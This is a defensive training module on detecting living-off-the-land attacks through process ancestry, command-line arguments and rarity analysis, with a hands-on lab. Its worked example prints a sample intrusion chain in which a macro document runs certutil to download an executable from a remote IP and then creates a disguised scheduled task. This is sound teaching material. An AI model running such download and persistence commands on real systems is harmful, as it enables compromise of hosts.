Module 4's tuning ladder put "sharpen the hypothesis" at the top, and this module is what that looks like when you take it seriously. It also confronts the situation that breaks artefact-based detection completely: **the adversary who introduces no malware at all.**

Living off the land means operating with the tools already installed and already trusted — `powershell.exe`, `certutil.exe`, `rundll32.exe`, `wmic.exe`, `mshta.exe`. There is no hash to block, because the binary is Microsoft-signed and present on every host in the estate. There is no suspicious file to find, because no file was dropped. Everything on the bottom two rows of the Pyramid of Pain from Module 1 is worthless here. What is left is *how the tool was used and what asked it to run* — and that is the entire subject of behavioural detection.

## The binary is not the signal

The LOLBAS project catalogues these Living Off The Land Binaries, Scripts and Libraries, and reading a few entries reframes the problem quickly:

| Binary | Legitimate purpose | Abused for |
|---|---|---|
| `certutil.exe` | Certificate management | Downloading files, base64 encode/decode, hiding data in alternate data streams |
| `mshta.exe` | Run HTML applications | Executing remote HTAs and inline VBScript/JScript |
| `rundll32.exe` | Load and run DLLs | Executing arbitrary DLLs, remote code, COM objects and JScript payloads |

ATT&CK groups this as **T1218 System Binary Proxy Execution**: the adversary proxies their execution through a signed system binary precisely so that allowlisting and reputation checks wave it through. The counterpart on Unix is the GTFOBins catalogue, and the logic is identical.

So if `certutil.exe` running is normal and `certutil.exe` running is also the attack, what distinguishes them? Three things, and they are the working vocabulary of this module: **ancestry**, **arguments** and **rarity**.

## Ancestry: who asked for this

The single highest-value behavioural signal on Windows is the **parent-child process relationship**. Individually, `winword.exe` is normal and `powershell.exe` is normal. `winword.exe` spawning `powershell.exe` is a macro executing code — **T1204.002 User Execution: Malicious File** — and it is close to never legitimate.

That pattern generalises into a set of relationships worth knowing by heart:

- An Office application spawning any script interpreter or shell.
- A browser spawning a shell.
- `services.exe` spawning something unexpected — often **T1543.003 Windows Service** persistence.
- `svchost.exe` with a parent that is not `services.exe`, a classic masquerading tell.
- Any interpreter spawned by a process that has no business scripting.

The reason this works is structural, and it is why the signal is durable: **the attacker controls the child but rarely controls the parent.** A phishing payload has to execute *from somewhere*, and that somewhere is the document reader, the mail client, or the browser that delivered it. Changing the tool is trivial; changing what launched it means changing the delivery mechanism.

## Arguments: what it was asked to do

Once you have the process, the command line usually carries the intent. Encoded PowerShell (`-enc`), download cradles, `certutil -urlcache -f`, execution policy bypasses — these are the arguments that distinguish administrative use from abuse.

<Callout type="warn">
This entire class of detection depends on telemetry that is **off by default**, which is the recurring theme of the platform and the most common reason behavioural rules never fire.

Windows event **4688** (process creation) requires the **Audit Process Creation** policy, whose default is *Not configured*. Worse, 4688 does **not include the command line** unless you separately enable **"Include command line in process creation events"** (Administrative Templates > System > Audit Process Creation), also *Not configured* by default. Without that second setting you get "powershell.exe ran" and nothing about what it did, which is almost useless for this module's purposes. Sysmon Event ID 1 provides process creation with parent and command line as an alternative.

Two operational details worth carrying: Microsoft warns that with command-line auditing enabled, "any user with access to read the security events will be able to read the command line arguments for any successfully created process", and command lines "can contain sensitive or private information such as passwords" — so the Security log becomes a credential source and needs to be treated as one. And event **4719** is logged when advanced audit policy settings are overwritten by basic audit policy, which is how carefully-configured auditing silently reverts.
</Callout>

## Rarity: the cheapest anomaly detection there is

The third signal needs no machine learning and is consistently underrated. **Stack counting** — sometimes called long-tail analysis — means aggregating a field across the estate and reading the bottom of the list.

Count every parent-child pair across 10,000 endpoints. The top of the list is thousands of identical, boring pairs. The bottom is the pairs that happened once. Compromise lives in the long tail, because whatever the adversary did, they did it on a handful of machines and everyone else did not.

The same trick applies to almost any field: services run once across the estate, scheduled tasks with a unique name (**T1053.005**), a signed binary executing from one unusual path (**T1036 Masquerading**), a DLL loaded by a single host. Rarity is not proof of malice — it is a ranking function that puts a human in front of the right 20 events instead of the wrong 20,000.

<Callout type="key">
The trade-off from Module 1's pyramid, now concrete. Behavioural detections are **durable** — they survive the adversary changing tools, infrastructure and payloads, because they describe something the intrusion cannot avoid doing. They are also **where all the false positives live**, because legitimate software genuinely does most of these things: administrators use PowerShell, deployment tools spawn interpreters, backup agents behave strangely by design.

This is not a flaw to engineer away. It is the deal: **you trade precision for durability, and you pay for that trade with tuning.** Module 4 is what makes Module 5 deployable. A team that wants behavioural coverage without investing in tuning gets neither, because the noise forces the rules off within a month.
</Callout>

## Reading a process tree

Rung 3. Here is a process ancestry chain from one workstation. Nothing in it is malware, and every binary is Microsoft-signed. Decide what happened before reading on.

```text
explorer.exe
 |- outlook.exe
     |- winword.exe            [Invoice_Q3.docm]
         |- cmd.exe            /c certutil -urlcache -split -f
                                  http://185.x.x.x/a.txt %TEMP%\a.exe
             |- certutil.exe
             |- schtasks.exe   /create /tn "OneDriveSync"
                                  /tr %TEMP%\a.exe /sc minute /mo 30
```

Read it top down and the whole intrusion is legible without a single hash. `outlook.exe` to `winword.exe` is a user opening a mailed attachment — note the `.docm`, a macro-enabled document. `winword.exe` spawning `cmd.exe` is the macro executing: **T1204.002**. `certutil` with `-urlcache -f` is not certificate management, it is a downloader: **T1218**. Then `schtasks` creating a task named `OneDriveSync` that runs a binary out of `%TEMP%` every 30 minutes is persistence — **T1053.005** — with a name chosen to survive a bored glance, which is **T1036 Masquerading**.

Now notice what a purely artefact-based approach would have produced here: `a.exe` is unknown to reputation services, and every other component is a signed Microsoft binary doing something it is legitimately capable of. The detection has to come from the *shape* of the tree.

The practical lesson is that **the strongest detections in this chain are the earliest ones.** An alert on Office spawning a shell catches this at step three, before download and before persistence. An alert on the scheduled task catches it after the adversary already has a foothold and a return path. Both are worth having; only one gives you a chance to end the incident cheaply.

<Lab title="Build a process-ancestry baseline and hunt the long tail" host="Detection lab VM (Windows + Sysmon) + your log platform" minutes={70}>

You are going to establish what normal looks like on your own lab, then detect a living-off-the-land chain you execute yourself — with no reliance on hashes or reputation.

1. **Instrument properly.** Confirm you are collecting process creation with both parent and command line. Either enable Audit Process Creation *and* "Include command line in process creation events", or use Sysmon Event ID 1. Verify by inspecting one real event and confirming the command line is populated — do not assume it.
2. **Baseline.** Over at least 24 hours of ordinary use, aggregate every parent-child process pair. Produce a stack-ranked table: pair, count. Record how many distinct pairs you see and how many occurred only once.
3. **Read the long tail.** Examine the rarest 20 pairs. For each, decide whether it is benign and why. This is the skill — most will be legitimate, and articulating why is what makes the rare ones stand out later.
4. **Execute a chain.** Safely, in your lab, reproduce a benign version of the worked example: have a document or script spawn `cmd.exe`, use a LOLBin to fetch a harmless file from a host you control, and create a scheduled task pointing at it. Do not use real malware — the point is the shape, not the payload.
5. **Find it without hashes.** Search only on behaviour: the unusual parent-child pair, the LOLBin arguments, the new scheduled task. Confirm you can reconstruct the full chain from telemetry alone.
6. **Write two detections.** One early (unusual parent spawning an interpreter) and one late (scheduled task creation from a temp path). Note which fired first and what each would have given a responder.
7. **Estimate the cost.** For the early rule, count how many times it would have fired against your 24-hour baseline. That number is its false positive rate in your environment — carry it into the tuning cycle from Module 4.

**Evidence of completion:** a journal entry with (a) proof your telemetry includes parent and command line, with a sample event, (b) your stack-ranked parent-child table with counts and the number of single-occurrence pairs, (c) your analysis of the rarest 20 with a benign/suspicious verdict for each, (d) the reconstructed chain found by behaviour alone, and (e) both detections with the early rule's measured false positive count from your baseline. Item (c) is the one that builds the actual skill: knowing what is normal in an environment is what makes abnormal visible, and it cannot be learned from a rule library.

</Lab>
